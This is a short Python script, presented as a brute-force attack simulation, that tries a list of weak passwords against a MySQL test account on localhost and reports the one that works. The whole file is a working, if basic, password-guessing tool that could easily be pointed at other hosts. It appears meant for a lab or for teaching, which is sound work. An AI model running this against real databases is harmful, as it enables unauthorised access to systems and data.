import mysql.connector
from mysql.connector import Error

# Database connection info
host = "localhost"
username = "testdbuser"
password_list = ["123456", "password", "testpassword", "admin123"]  # Weak passwords

def mysql_brute_force():
    print("Starting MySQL brute-force attack simulation...\n")
    
    for password in password_list:
        try:
            print(f"Trying password: {password}")
            connection = mysql.connector.connect(
                host=host,
                user=username,
                password=password
            )
            if connection.is_connected():
                print("\nLogin successful!")
                print(f"The correct password is: {password}")
                connection.close()
                break
        except Error as e:
            print(f"Login failed: {e}")
    else:
        print("Brute-force attack simulation complete. No password matched.")

if __name__ == "__main__":
    mysql_brute_force()
